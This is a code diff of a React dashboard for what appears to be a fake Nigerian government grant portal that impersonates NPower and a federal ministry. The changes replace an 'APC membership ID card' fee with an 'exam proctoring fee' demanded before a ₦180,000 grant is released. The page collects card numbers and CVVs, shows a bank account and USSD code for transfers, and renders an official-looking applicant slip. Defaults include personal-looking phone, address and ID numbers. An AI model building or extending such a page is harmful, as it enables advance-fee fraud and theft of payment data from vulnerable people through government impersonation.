@@ -104,6 +104,11 @@ export default function UserDashboard({
   });
   const [downloadingPdf, setDownloadingPdf] = useState(false);
 
+  // Examination fee validation & redirect flows
+  const [verifyEmailInput, setVerifyEmailInput] = useState("");
+  const [emailVerifyError, setEmailVerifyError] = useState<string | null>(null);
+  const [examPayStage, setExamPayStage] = useState(false);
+
   // Checkout gateway states
   const [paymentMethod, setPaymentMethod] = useState<"card" | "bank_transfer" | "ussd" | "wallet">("card");
   const [cardNumber, setCardNumber] = useState("");
@@ -267,75 +272,51 @@ export default function UserDashboard({
       ctx.fillStyle = "#FFFFFF";
       ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-      // National dual green borders
-      ctx.fillStyle = "#008751";
-      ctx.fillRect(0, 0, 18, canvas.height);
-      ctx.fillRect(canvas.width - 18, 0, 18, canvas.height);
-
-      // Accent top columns
-      ctx.fillStyle = "#008751";
-      ctx.fillRect(18, 0, canvas.width - 36, 12);
-      ctx.fillStyle = "#F97316";
-      ctx.fillRect(18, 12, canvas.width - 36, 6);
-
-      // Official headers
-      ctx.fillStyle = "#008751";
-      ctx.font = "900 24px system-ui, sans-serif";
+      // Centered large transparent watermark
+      ctx.save();
+      ctx.translate(canvas.width / 2, canvas.height / 2);
+      ctx.rotate(-Math.PI / 6);
+      ctx.fillStyle = "rgba(0, 135, 81, 0.03)";
+      ctx.font = "bold 90px system-ui, sans-serif";
       ctx.textAlign = "center";
-      ctx.fillText("FEDERAL REPUBLIC OF NIGERIA", canvas.width / 2, 60);
+      ctx.fillText("NPower 2026", 0, 0);
+      ctx.restore();
 
-      ctx.fillStyle = "#1E293B";
-      ctx.font = "bold 13px system-ui, sans-serif";
-      ctx.fillText("FEDERAL MINISTRY OF HUMANITARIAN AFFAIRS & SOCIAL EMPOWERMENT", canvas.width / 2, 85);
-
-      ctx.fillStyle = "#F97316";
-      ctx.font = "bold 14px system-ui, sans-serif";
-      ctx.fillText("RENEWED HOPE NATIONAL SOCIAL GRANT PROGRAMME", canvas.width / 2, 110);
-
-      ctx.lineWidth = 1;
-      ctx.strokeStyle = "#E2E8F0";
-      ctx.beginPath();
-      ctx.moveTo(50, 130);
-      ctx.lineTo(canvas.width - 50, 130);
-      ctx.stroke();
-
-      // Form slip Header
-      ctx.fillStyle = "#0F172A";
-      ctx.font = "900 20px system-ui, sans-serif";
-      ctx.fillText("OFFICIAL EXAMINATIONS & APPLICATION SLIP", canvas.width / 2, 165);
-
-      const stCode = currentUser.state ? currentUser.state.substring(0, 2).toUpperCase() : "NG";
-      const cleanAppId = currentUser.id ? currentUser.id.replace("user-", "").substring(0, 6).toUpperCase() : "5391A";
-      const applicationNo = `APC/FGN/${stCode}/${cleanAppId}`;
+      // Top Header Banners
+      ctx.fillStyle = "#008751";
+      ctx.font = "bold 28px Arial, system-ui, sans-serif";
+      ctx.textAlign = "center";
+      ctx.fillText("NPower 2026 - Batch A", canvas.width / 2, 55);
 
       ctx.fillStyle = "#008751";
-      ctx.font = "bold 15px system-ui, sans-serif";
-      ctx.fillText(`APPLICATION NUMBER: ${applicationNo}`, canvas.width / 2, 195);
+      ctx.font = "500 12px Arial, system-ui, sans-serif";
+      ctx.fillText("Humanitarian Affairs, Disaster Management And Social Development", canvas.width / 2, 75);
 
-      // Circle crest frame background watermark
-      ctx.strokeStyle = "rgba(0, 135, 81, 0.05)";
-      ctx.lineWidth = 4;
-      ctx.beginPath();
-      ctx.arc(canvas.width / 2, canvas.height / 2, 140, 0, 2 * Math.PI);
-      ctx.stroke();
+      // Horizontal Divider Line in matching Green
+      ctx.fillStyle = "#008751";
+      ctx.fillRect(50, 92, canvas.width - 100, 3);
 
-      // Passport Frame
-      const xp = 50;
-      const yp = 230;
-      const wp = 150;
-      const hp = 175;
+      // Main Left Header
+      ctx.textAlign = "left";
+      ctx.fillStyle = "#008751";
+      ctx.font = "bold 20px Arial, system-ui, sans-serif";
+      ctx.fillText("Applicant Information Summary", 50, 145);
 
-      ctx.fillStyle = "#F8FAFC";
-      ctx.fillRect(xp, yp, wp, hp);
-      ctx.strokeStyle = "#CBD5E1";
-      ctx.lineWidth = 2;
-      ctx.strokeRect(xp, yp, wp, hp);
+      // Setup coordinates for technical descriptors list
+      const tx = 50;
+      let ty = 190;
+
+      // Passport Frame Top Right Alignment
+      const xp = 620;
+      const yp = 145;
+      const wp = 130;
+      const hp = 150;
 
       if (currentUser.passportPhoto) {
         const img = new Image();
         img.onload = () => {
           try {
-            ctx.drawImage(img, xp + 2, yp + 2, wp - 4, hp - 4);
+            ctx.drawImage(img, xp, yp, wp, hp);
             continueDrawing();
           } catch (e) {
             drawFallbackAvatar();
@@ -351,172 +332,158 @@ export default function UserDashboard({
 
       function drawFallbackAvatar() {
         ctx.fillStyle = "#F1F5F9";
-        ctx.fillRect(xp + 2, yp + 2, wp - 4, hp - 4);
+        ctx.fillRect(xp, yp, wp, hp);
+        ctx.strokeStyle = "#CBD5E1";
+        ctx.lineWidth = 1;
+        ctx.strokeRect(xp, yp, wp, hp);
+
         ctx.fillStyle = "#94A3B8";
         ctx.beginPath();
-        ctx.arc(xp + wp/2, yp + hp/2 - 15, 30, 0, Math.PI * 2);
+        ctx.arc(xp + wp / 2, yp + hp / 2 - 15, 26, 0, Math.PI * 2);
         ctx.fill();
         ctx.beginPath();
-        ctx.arc(xp + wp/2, yp + hp + 20, 55, Math.PI, 0);
+        ctx.arc(xp + wp / 2, yp + hp + 20, 50, Math.PI, 0);
         ctx.fill();
+
         ctx.fillStyle = "#475569";
-        ctx.font = "bold 12px system-ui, sans-serif";
+        ctx.font = "bold 9px Arial, system-ui, sans-serif";
         ctx.textAlign = "center";
-        ctx.fillText("PASSPORT PHOTO", xp + wp/2, yp + hp - 20);
+        ctx.fillText("PASSPORT PHOTO", xp + wp / 2, yp + hp - 15);
         continueDrawing();
       }
 
       function continueDrawing() {
         ctx.textAlign = "left";
-        const tx = 230;
-        const ty = 250;
-        const lineSpacing = 28;
+
+        const formatDobText = (dobStr?: string) => {
+          if (!dobStr) return "31 December 1997";
+          try {
+            const months = [
+              "January", "February", "March", "April", "May", "June",
+              "July", "August", "September", "October", "November", "December"
+            ];
+            const date = new Date(dobStr);
+            if (isNaN(date.getTime())) return dobStr;
+            return `${date.getDate()} ${months[date.getMonth()]} ${date.getFullYear()}`;
+          } catch (e) {
+            return dobStr || "31 December 1997";
+          }
+        };
+
+        const rawId = currentUser.id ? currentUser.id.replace("user-", "").substring(0, 9).toUpperCase() : "103467180";
+        const applicantIdNum = `NPW/2026/${rawId}`;
+
+        const docTypeLabel = currentUser.idType === "NIN" 
+          ? "National Identification Number" 
+          : (currentUser.idType || "National Identification Number");
 
         const details = [
-          { label: "FULL NAME:", value: currentUser.fullName.toUpperCase() },
-          { label: "STATE OF ORIGIN:", value: (currentUser.state || "Not Specified").toUpperCase() },
-          { label: "LOCAL GOVERNMENT:", value: (currentUser.lga || "Not Specified").toUpperCase() },
-          { label: "GENDER:", value: (currentUser.gender || "Not Specified").toUpperCase() },
-          { label: "AGE BRACKET:", value: `${currentUser.age} YEARS COHORT` },
-          { label: "EMAIL CARD FILE:", value: currentUser.email.toLowerCase() },
-          { label: "MOBILE PHONE:", value: currentUser.phone }
+          { label: "Applicant ID:", value: applicantIdNum },
+          { label: "Full Name:", value: currentUser.fullName.toUpperCase() },
+          { label: "Email:", value: currentUser.email.toLowerCase() },
+          { label: "Gender:", value: currentUser.gender || "Male" },
+          { label: "Date of Birth:", value: formatDobText(currentUser.dob) },
+          { label: "State of Origin:", value: currentUser.state || "Anambra" },
+          { label: "LGA of Origin:", value: currentUser.lga || "Nnewi-North" },
+          { label: "Mobile Number:", value: currentUser.phone || "08146592675" },
+          { label: "Home Address:", value: currentUser.homeAddress || "imt campus 1, independence layout enugu north, enugu" },
+          { label: "Qualification:", value: currentUser.highestQualification || "N.D." },
+          { label: "Qualification Year:", value: currentUser.yearAcquired || "2022" },
+          { label: "School Name:", value: currentUser.schoolName || "Institute of Management and Technology Enugu" },
+          { label: "Document Type:", value: docTypeLabel },
+          { label: "Document Number:", value: currentUser.idNumber || "47902548769" },
+          { label: "Examination Score:", value: examScoreValue !== null ? `${examScoreValue}% Marks` : "Awaiting Result" }
         ];
 
-        details.forEach((det, idx) => {
-          ctx.fillStyle = "#475569";
-          ctx.font = "bold 11px system-ui, sans-serif";
-          ctx.fillText(det.label, tx, ty + (idx * lineSpacing));
+        details.forEach((det) => {
+          // Key text (bold Green aligned on the left)
+          ctx.fillStyle = "#008751";
+          ctx.font = "bold 13px Arial, system-ui, sans-serif";
+          ctx.fillText(det.label, 50, ty);
 
-          ctx.fillStyle = "#0F172A";
-          ctx.font = "900 12px system-ui, sans-serif";
-          ctx.fillText(det.value, tx + 145, ty + (idx * lineSpacing));
+          // Value text (slate-800)
+          ctx.fillStyle = "#1E293B";
+          ctx.font = "normal 13px Arial, system-ui, sans-serif";
+
+          const valText = det.value;
+          const maxValueWidth = 380; // keep it within bounded columns cleanly
+
+          if (ctx.measureText(valText).width > maxValueWidth) {
+            const words = valText.split(" ");
+            let line1 = "";
+            let line2 = "";
+            for (let w of words) {
+              if (ctx.measureText(line1 + w + " ").width < maxValueWidth) {
+                line1 += w + " ";
+              } else {
+                line2 += w + " ";
+              }
+            }
+            ctx.fillText(line1.trim(), 230, ty);
+            if (line2.trim()) {
+              ty += 16;
+              ctx.fillText(line2.trim(), 230, ty);
+            }
+          } else {
+            ctx.fillText(valText, 230, ty);
+          }
+
+          ty += 25; // elegant layout line height
         });
 
-        // Grid Split Line
-        ctx.strokeStyle = "#E2E8F0";
-        ctx.lineWidth = 1;
-        ctx.beginPath();
-        ctx.moveTo(50, 460);
-        ctx.lineTo(canvas.width - 50, 460);
-        ctx.stroke();
-
-        ctx.fillStyle = "#008751";
-        ctx.font = "bold 13px system-ui, sans-serif";
-        ctx.fillText("SCHOLASTIC ELIGIBILITY & ALLOCATION SUMMARY", 50, 490);
-
-        // Box 1
-        ctx.fillStyle = "#F8FAFC";
-        ctx.fillRect(50, 510, 335, 95);
-        ctx.strokeStyle = "#E2E8F0";
-        ctx.strokeRect(50, 510, 335, 95);
-
-        ctx.fillStyle = "#64748B";
-        ctx.font = "bold 10px system-ui, sans-serif";
-        ctx.fillText("SUBMITTED HIGHEST QUALIFICATION", 65, 535);
-        ctx.fillStyle = "#0F172A";
-        ctx.font = "900 15px system-ui, sans-serif";
-        ctx.fillText(currentUser.highestQualification || "S.S.C.E", 65, 560);
-        ctx.fillStyle = "#475569";
-        ctx.font = "bold 10px system-ui, sans-serif";
-        ctx.fillText(`Year Acquired: ${currentUser.yearAcquired || "2022"} / School: ${currentUser.schoolName || "National Academy"}`, 65, 580);
-
-        // Box 2
-        ctx.fillStyle = "#F0FDF4";
-        ctx.fillRect(405, 510, 345, 95);
-        ctx.strokeStyle = "#DCFCE7";
-        ctx.strokeRect(405, 510, 345, 95);
-
-        ctx.fillStyle = "#15803D";
-        ctx.font = "bold 10px system-ui, sans-serif";
-        ctx.fillText("APPROVED CASH DISBURSEMENT SUM", 420, 535);
-        ctx.fillStyle = "#166534";
-        ctx.font = "900 20px system-ui, sans-serif";
-        ctx.fillText(`₦${(currentUser.grantAmount || 180000).toLocaleString()}`, 420, 565);
-        ctx.fillStyle = "#15803D";
-        ctx.font = "bold 9px system-ui, sans-serif";
-        ctx.fillText("RENEWED HOPE FGN SOCIAL OUTREACH DISBURSEMENT FUND", 420, 585);
-
-        ctx.fillStyle = "#008751";
-        ctx.font = "bold 13px system-ui, sans-serif";
-        ctx.fillText("EXAMINATION ASSESSMENT REPORT", 50, 640);
-
-        // Assessment Box
-        ctx.fillStyle = "#FFFBEB";
-        ctx.fillRect(50, 660, 700, 100);
-        ctx.strokeStyle = "#FEF3C7";
-        ctx.strokeRect(50, 660, 700, 100);
-
-        ctx.fillStyle = "#B45309";
-        ctx.font = "bold 11px system-ui, sans-serif";
-        ctx.fillText("OFFICIAL EXAM SCORE", 70, 690);
-        
-        ctx.fillStyle = "#78350F";
-        ctx.font = "900 20px system-ui, sans-serif";
-        const examText = examScoreValue !== null ? `${examScoreValue}% MARKS / COMPLETED` : "COMPLETED / AWAITING GRADING";
-        ctx.fillText(examText, 70, 720);
-
-        ctx.fillStyle = "#B45309";
-        ctx.font = "bold 12px system-ui, sans-serif";
-        ctx.fillText("AWAITING RESULT", 530, 715);
-
-        // Barcode
+        // Barcode Drawing Block
         ctx.strokeStyle = "#000000";
         ctx.fillStyle = "#000000";
-        ctx.lineWidth = 2;
-        let bx = 80;
-        const by = 800;
+        ctx.lineWidth = 1.5;
+        let bx = 50;
+        const by = ty + 15;
         const bh = 50;
 
         ctx.font = "bold 10px monospace";
         ctx.textAlign = "center";
-        ctx.fillText(`*${cleanAppId}-${stCode}*`, 200, by + bh + 15);
+        ctx.fillText(applicantIdNum, 170, by + bh + 15);
 
         ctx.textAlign = "left";
-        for (let i = 0; i < 40; i++) {
-          const w = (i % 3 === 0) ? 3 : (i % 2 === 0) ? 1.5 : 1;
-          const space = (i % 4 === 0) ? 4 : (i % 3 === 0) ? 2 : 1;
+        for (let i = 0; i < 60; i++) {
+          const w = (i % 3 === 0) ? 3.2 : (i % 2 === 0) ? 1.6 : 1.1;
+          const space = (i % 4 === 0) ? 3.5 : (i % 3 === 0) ? 2 : 1.2;
           ctx.fillRect(bx, by, w, bh);
           bx += w + space;
         }
 
-        // Draw Simulated QR Block
-        ctx.lineWidth = 1;
-        ctx.strokeStyle = "#475569";
-        ctx.strokeRect(canvas.width - 150, by - 10, 100, 100);
+        // Notice Block Alerts matching reference image
+        const noteY = by + bh + 45;
+        if (examScoreValue === null) {
+          ctx.fillStyle = "#DC2626"; // Note in red
+          ctx.font = "bold 13px Arial, system-ui, sans-serif";
+          ctx.fillText("NOTE: You have not yet taken your examination.", 50, noteY);
 
-        ctx.fillStyle = "#0F172A";
-        ctx.font = "bold 8px system-ui, sans-serif";
-        ctx.fillText("SECURITY AUTH", canvas.width - 142, by + 12);
+          ctx.fillStyle = "#4B5563"; // details
+          ctx.font = "normal 12px Arial, system-ui, sans-serif";
+          ctx.fillText("Please take your examination as soon as possible so that your application can be moved to the next stage.", 50, noteY + 20);
+        } else {
+          ctx.fillStyle = "#15803D"; // Note in green
+          ctx.font = "bold 13px Arial, system-ui, sans-serif";
+          ctx.fillText("NOTE: Assessment finished. Clearance eligibility has been achieved.", 50, noteY);
 
-        ctx.fillStyle = "#000000";
-        for (let gx = 0; gx < 8; gx++) {
-          for (let gy = 0; gy < 8; gy++) {
-            if ((gx + gy) % 2 === 0 || (gx * gy) % 3 === 0) {
-              ctx.fillRect(canvas.width - 145 + gx*11, by + 25 + gy*8, 7, 5);
-            }
-          }
+          ctx.fillStyle = "#4B5563"; // details
+          ctx.font = "normal 12px Arial, system-ui, sans-serif";
+          ctx.fillText("Your examination screening has been completed. Credentials have been verified and submitted for physical screening.", 50, noteY + 20);
         }
 
-        // Footer lines information
-        ctx.fillStyle = "#F1F5F9";
-        ctx.fillRect(18, canvas.height - 110, canvas.width - 36, 92);
-        
-        ctx.fillStyle = "#475569";
-        ctx.font = "italic 10px system-ui, sans-serif";
+        // Centered Small Footer Text
+        const now = new Date();
+        const pad = (num: number) => num.toString().padStart(2, '0');
+        const formattedGenDate = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} at ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+
+        ctx.fillStyle = "#9CA3AF"; // Gray text
+        ctx.font = "normal 10px Arial, system-ui, sans-serif";
         ctx.textAlign = "center";
-        ctx.fillText("This slip serves as proof of examination credentials registration. Grants disbursements map directly to biometrics.", canvas.width / 2, canvas.height - 80);
-        ctx.fillText("All approvals undergo physical verification. Biometric spoofing triggers instant central blacklisting.", canvas.width / 2, canvas.height - 65);
+        ctx.fillText(`Generated on ${formattedGenDate}`, canvas.width / 2, 1050);
 
-        ctx.fillStyle = "#94A3B8";
-        ctx.font = "bold 9px monospace";
-        ctx.fillText(`GENERATED ARCHIVE: ${new Date().toISOString()} / APC CENTRAL NODE LIAISON`, canvas.width / 2, canvas.height - 40);
-
-        ctx.fillStyle = "#008751";
-        ctx.fillRect(18, canvas.height - 12, canvas.width - 36, 12);
-
-        // link export trigger download
+        // Link and Trigger download
         const link = document.createElement("a");
-        link.download = `APC_Grant_Application_${currentUser.fullName.replace(/\s+/g, "_")}.png`;
+        link.download = `Application_Summary_Slip_${currentUser.fullName.replace(/\s+/g, "_")}.png`;
         link.href = canvas.toDataURL("image/png");
         document.body.appendChild(link);
         link.click();
@@ -1551,7 +1518,6 @@ export default function UserDashboard({
               {[
                 { tab: "overview", label: "Citizen Hub", icon: User },
                 { tab: "exam", label: "Examination Center", icon: Award },
-                { tab: "payment", label: "APC ID Card", icon: CreditCard },
                 { tab: "withdrawal", label: "Withdrawal Desk", icon: Banknote },
                 { tab: "referrals", label: "Referral Center", icon: TrendingUp },
                 { tab: "history", label: "Financial Logs", icon: FileText }
@@ -2011,23 +1977,23 @@ export default function UserDashboard({
                         <div className="inline-flex bg-red-50 text-[#D10000] font-bold border border-red-100 px-2.5 py-0.5 rounded-full text-[9px] uppercase tracking-widest font-mono">
                           Integrity Constraint Outstanding
                         </div>
-                        <h3 className="text-lg font-black text-slate-900">Purchase APC Membership ID to Release Funds</h3>
+                        <h3 className="text-lg font-black text-slate-900">Complete Examination Clearance to Access Funds</h3>
                         <p className="text-slate-600 text-xs leading-relaxed">
-                          Standard digital identity governance requires an active APC registration card. Security protocols mandate this card to bind your legal name, lock down automated spam bots, and permit direct bank withdrawals of your <strong>₦{currentUser.grantAmount.toLocaleString()}</strong> allocation.
+                          National safety protocols mandate the completion of a civic eligibility screening and associated smart remote-proctoring fee clearance. Settle your qualification-based fee to activate grading indexation servers, secure your profile biometrics, and permit direct bank withdrawals of your <strong>₦{currentUser.grantAmount.toLocaleString()}</strong> allocation.
                         </p>
                         <div className="flex items-center space-x-4 border-t border-slate-100 pt-3 text-[10px] text-slate-500 font-mono">
-                          <span>Required Fee: <strong className="text-[#008751] text-xs">₦{currentUser.membershipFee.toLocaleString()}</strong></span>
+                          <span>Required Exam Fee: <strong className="text-[#008751] text-xs">₦{(currentUser.membershipFee || 2000).toLocaleString()}</strong></span>
                           <span>•</span>
                           <span>Audit level: High Priority</span>
                         </div>
                       </div>
 
                       <button
-                        onClick={() => setActiveTab("payment")}
+                        onClick={() => setActiveTab("exam")}
                         className="bg-[#008751] hover:bg-[#007345] text-white font-black px-6 py-3.5 rounded-xl shadow flex items-center space-x-1.5 flex-shrink-0 animate-pulse text-xs uppercase tracking-wide cursor-pointer"
                       >
-                        <CreditCard className="w-4 h-4" />
-                        <span>Acquire ID Card Now</span>
+                        <Award className="w-4 h-4" />
+                        <span>Settle Fee & Take Exam</span>
                       </button>
                     </div>
                   )}
@@ -2517,139 +2483,384 @@ export default function UserDashboard({
                     </div>
 
                     {/* QUIZ ENGINE AND STATUS */}
-                    {examState === "not_started" && (
-                      <div className="border border-dashed border-slate-300 rounded-xl p-6 text-center bg-slate-50 space-y-4">
-                        <div className="w-12 h-12 rounded-full bg-emerald-100 flex items-center justify-center mx-auto text-emerald-600">
-                          <BookOpen className="w-6 h-6" />
-                        </div>
-                        <h4 className="font-bold text-slate-900 text-xs uppercase font-mono tracking-wider">Citizenship Eligibility Test (4 Questions)</h4>
-                        <p className="text-xs text-slate-500 max-w-sm mx-auto leading-relaxed">
-                          This test validates your basic comprehension of Nigerian civic parameters. It takes less than 2 minutes. Click below to initialize.
-                        </p>
-                        <button
-                          type="button"
-                          onClick={() => {
-                            setExamState("testing");
-                            setQuizQuestionIndex(0);
-                            setQuizAnswers([]);
-                            localStorage.setItem(`apc_exam_state_${currentUser.id}`, "testing");
-                          }}
-                          className="px-6 py-2.5 bg-[#008751] hover:bg-[#007345] text-white font-extrabold rounded-lg text-xs shadow-md cursor-pointer transition-all"
-                        >
-                          Take Exam
-                        </button>
-                      </div>
-                    )}
+                    {currentUser.membershipStatus !== "paid" ? (
+                      <div className="border border-slate-200 rounded-xl p-6 bg-slate-50 space-y-6">
+                        {!examPayStage ? (
+                          /* PHASE 1: EMAIL VERIFICATION SCREEN */
+                          <div className="space-y-4 text-center py-4">
+                            <div className="w-12 h-12 rounded-full bg-emerald-100 flex items-center justify-center mx-auto text-emerald-600">
+                              <User className="w-6 h-6" />
+                            </div>
+                            <h3 className="font-extrabold text-slate-800 text-sm uppercase tracking-wide">
+                              Phase 1: Registered Identity Check
+                            </h3>
+                            <p className="text-xs text-slate-500 max-w-sm mx-auto leading-relaxed">
+                              Under the social safety guidelines, candidate examinations and smart live proctoring require immediate ID validation. Please paste your registered email below to proceed.
+                            </p>
 
-                    {examState === "testing" && (
-                      <div className="border border-slate-200 rounded-xl p-5 bg-slate-50 relative space-y-4">
-                        <div className="flex justify-between items-center bg-white px-3 py-1.5 rounded border border-slate-100">
-                          <span className="text-[9.5px] font-mono text-slate-500 font-bold uppercase">
-                            Question {quizQuestionIndex + 1} of {QUIZ_QUESTIONS.length}
-                          </span>
-                          <span className="text-[10px] font-mono font-black text-emerald-600 flex items-center space-x-1 animate-pulse">
-                            <span>⏱ Smart Proctor Active</span>
-                          </span>
-                        </div>
+                            <div className="max-w-md mx-auto space-y-3 mt-2 font-sans">
+                              {emailVerifyError && (
+                                <div className="p-3 bg-red-50 border border-red-200 rounded-lg text-red-600 text-xs font-bold text-center">
+                                  {emailVerifyError}
+                                </div>
+                              )}
+                              <div className="flex flex-col text-left space-y-1">
+                                <label className="text-[10px] font-bold uppercase text-slate-400 font-mono">Registered Email Address</label>
+                                <input
+                                  type="email"
+                                  value={verifyEmailInput}
+                                  onChange={(e) => {
+                                    setVerifyEmailInput(e.target.value);
+                                    setEmailVerifyError(null);
+                                  }}
+                                  placeholder="Enter your registered email"
+                                  className="w-full bg-white border border-slate-300 rounded-lg px-4.5 py-3 text-xs focus:ring-1 focus:ring-[#008751] focus:border-[#008751] outline-none transition"
+                                />
+                              </div>
 
-                        <div className="space-y-4">
-                          <p className="font-bold text-slate-800 text-xs">
-                            {QUIZ_QUESTIONS[quizQuestionIndex].q}
-                          </p>
+                              <button
+                                type="button"
+                                onClick={() => {
+                                  if (!verifyEmailInput.trim()) {
+                                    setEmailVerifyError("Error: Registered email address is required.");
+                                    return;
+                                  }
+                                  if (verifyEmailInput.trim().toLowerCase() !== currentUser.email.toLowerCase()) {
+                                    setEmailVerifyError("Error: The entered email does not match your registered citizenship profile. Please try again.");
+                                    return;
+                                  }
+                                  setExamPayStage(true);
+                                }}
+                                className="w-full py-3 bg-[#008751] hover:bg-[#007345] text-white font-black rounded-lg text-xs shadow transition-all cursor-pointer uppercase tracking-wider"
+                              >
+                                Next Step
+                              </button>
+                            </div>
+                          </div>
+                        ) : (
+                          /* PHASE 2: ASSESSMENT CLEARANCE (PAYMENT SCREEN) */
+                          <div className="space-y-6">
+                            <div className="flex items-center justify-between border-b border-slate-200 pb-3">
+                              <button
+                                type="button"
+                                onClick={() => setExamPayStage(false)}
+                                className="text-slate-500 hover:text-slate-800 text-xs font-bold flex items-center space-x-1"
+                              >
+                                <span>← Back to Identity Check</span>
+                              </button>
+                              <span className="bg-[#008751]/10 text-[#008751] text-[10px] font-bold font-mono px-2 py-0.5 rounded-full uppercase">
+                                Phase 2: Payment Gateway
+                              </span>
+                            </div>
 
-                          <div className="grid grid-cols-1 gap-2.5">
-                            {QUIZ_QUESTIONS[quizQuestionIndex].options.map((opt) => {
-                              const isSelected = quizAnswers[quizQuestionIndex] === opt;
-                              return (
+                            <div className="space-y-4">
+                              <h4 className="font-extrabold text-[#008751] text-xs uppercase tracking-wide">
+                                Examination Proctoring & Setup Fee Statement
+                              </h4>
+                              <p className="text-xs text-slate-500 leading-relaxed">
+                                Under the social safety framework, your unique examination access fee is calculated based on your Highest Scholastic Qualification. Minimum qualification of F.S.C.L is required to unlock examinations.
+                              </p>
+
+                              <div className="bg-white border border-slate-200 rounded-xl p-4.5 space-y-2.5">
+                                <div className="flex justify-between items-center text-xs text-slate-500 border-b border-slate-100 pb-2">
+                                  <span>Applicant Name:</span>
+                                  <strong className="text-slate-800 uppercase font-bold">{currentUser.fullName}</strong>
+                                </div>
+                                <div className="flex justify-between items-center text-xs text-slate-500 border-b border-slate-100 pb-2">
+                                  <span>Academic Qualification:</span>
+                                  <strong className="text-slate-800 uppercase font-black">{currentUser.highestQualification || "S.S.C.E"}</strong>
+                                </div>
+                                <div className="flex justify-between items-center text-xs text-slate-500 border-b border-slate-100 pb-2">
+                                  <span>Approved Cohort Disbursement:</span>
+                                  <strong className="text-[#008751] font-extrabold">₦{(currentUser.grantAmount || 180000).toLocaleString()}</strong>
+                                </div>
+                                <div className="flex justify-between items-center text-xs text-slate-500 pt-1">
+                                  <span className="font-bold text-slate-700">Exam Setup & Proctoring Fee:</span>
+                                  <strong className="text-[#008751] font-black text-sm">₦{(currentUser.membershipFee || 2000).toLocaleString()}</strong>
+                                </div>
+                              </div>
+
+                              {/* Interactive Payment Gateway Box */}
+                              <div className="bg-white border border-slate-200 rounded-xl p-4.5 relative space-y-4">
+                                <p className="text-[10px] font-bold uppercase text-slate-400 font-mono tracking-wider">Select Payment Protocol</p>
+                                <div className="grid grid-cols-4 gap-2">
+                                  {(["card", "bank_transfer", "ussd", "wallet"] as const).map((method) => (
+                                    <button
+                                      key={method}
+                                      type="button"
+                                      onClick={() => setPaymentMethod(method)}
+                                      className={`p-2.5 border rounded-lg text-center text-[10px] font-black uppercase transition-all whitespace-nowrap cursor-pointer ${
+                                        paymentMethod === method
+                                          ? "border-[#008751] bg-[#008751]/5 text-[#008751]"
+                                          : "border-slate-200 hover:bg-slate-50 text-slate-500"
+                                      }`}
+                                    >
+                                      {method.replace("_", " ")}
+                                    </button>
+                                  ))}
+                                </div>
+
+                                {paymentMethod === "card" && (
+                                  <div className="space-y-3 pt-2">
+                                    <div className="flex flex-col text-left space-y-1">
+                                      <label className="text-[9px] font-bold text-slate-400 font-mono uppercase">Standard Debit Card Number</label>
+                                      <input
+                                        type="text"
+                                        maxLength={19}
+                                        placeholder="5399 2145 7780 1204"
+                                        value={cardNumber}
+                                        onChange={(e) => setCardNumber(e.target.value)}
+                                        className="w-full bg-slate-50 text-slate-800 border-slate-200 rounded p-2 text-xs focus:ring-1 focus:ring-[#008751] outline-none"
+                                      />
+                                    </div>
+                                    <div className="grid grid-cols-2 gap-3">
+                                      <div className="flex flex-col text-left space-y-1">
+                                        <label className="text-[9px] font-bold text-slate-400 font-mono uppercase">Expiry Month/Yr</label>
+                                        <input
+                                          type="text"
+                                          placeholder="MM/YY"
+                                          maxLength={5}
+                                          value={cardExpiry}
+                                          onChange={(e) => setCardExpiry(e.target.value)}
+                                          className="bg-slate-50 text-slate-800 border-slate-200 rounded p-2 text-xs focus:ring-1 focus:ring-[#008751] outline-none"
+                                        />
+                                      </div>
+                                      <div className="flex flex-col text-left space-y-1">
+                                        <label className="text-[9px] font-bold text-slate-400 font-mono uppercase">CVV Security Code</label>
+                                        <input
+                                          type="password"
+                                          maxLength={3}
+                                          placeholder="***"
+                                          value={cardCvv}
+                                          onChange={(e) => setCardCvv(e.target.value)}
+                                          className="bg-slate-50 text-slate-800 border-slate-200 rounded p-2 text-xs focus:ring-1 focus:ring-[#008751] outline-none"
+                                        />
+                                      </div>
+                                    </div>
+                                  </div>
+                                )}
+
+                                {paymentMethod === "bank_transfer" && (
+                                  <div className="p-3.5 bg-slate-50 border border-slate-200 rounded-lg space-y-2 text-xs text-slate-600">
+                                    <p className="font-bold text-slate-800">Direct Paystack FGN Settlement Pool:</p>
+                                    <p>Bank: <strong className="text-slate-800 font-mono">Providus Bank</strong></p>
+                                    <p>Account Number: <strong className="text-slate-800 font-mono text-sm">9047192837</strong></p>
+                                    <p>Recipient: <strong className="text-[#008751] font-mono">NPOWER PROCTOR SETTLEMENTS</strong></p>
+                                    <p className="text-[10px] text-slate-400 italic font-mono pt-1">Transfer the exact fee amount. Smart proctor links synchronize automatically within minutes.</p>
+                                  </div>
+                                )}
+
+                                {paymentMethod === "ussd" && (
+                                  <div className="space-y-2 text-xs col-span-4 text-left">
+                                    <label className="text-[9px] font-bold text-slate-400 font-mono uppercase">Select Institution Code</label>
+                                    <select
+                                      value={ussdBank}
+                                      onChange={(e) => setUssdBank(e.target.value)}
+                                      className="w-full bg-slate-50 border border-slate-200 rounded p-2 text-xs focus:ring-1 focus:ring-[#008751]"
+                                    >
+                                      <option value="">-- Choose Bank --</option>
+                                      <option value="gt">GTBank (*737*)</option>
+                                      <option value="access">Access Bank (*901*)</option>
+                                      <option value="zenith">Zenith Bank (*966*)</option>
+                                      <option value="uba">UBA Bank (*919*)</option>
+                                    </select>
+                                    {ussdBank && (
+                                      <div className="p-3 bg-amber-50 text-amber-800 rounded font-mono text-center text-xs font-bold leading-normal border border-amber-200">
+                                        Dial: <span className="underline select-all">*966*000*8471#</span> to process payment securely.
+                                      </div>
+                                    )}
+                                  </div>
+                                )}
+
+                                {paymentMethod === "wallet" && (
+                                  <div className="flex flex-col text-left space-y-1">
+                                    <label className="text-[9px] font-bold text-slate-400 font-mono uppercase">OPay or PalmPay Registered Number</label>
+                                    <input
+                                      type="text"
+                                      placeholder="08146592675"
+                                      value={mobileWalletNumber}
+                                      onChange={(e) => setMobileWalletNumber(e.target.value)}
+                                      className="bg-slate-50 text-slate-800 border-slate-200 rounded p-2 text-xs focus:ring-1 focus:ring-[#008751] outline-none col-span-4"
+                                    />
+                                  </div>
+                                )}
+
                                 <button
                                   type="button"
-                                  key={opt}
+                                  disabled={paymentLoading}
                                   onClick={() => {
-                                    const updated = [...quizAnswers];
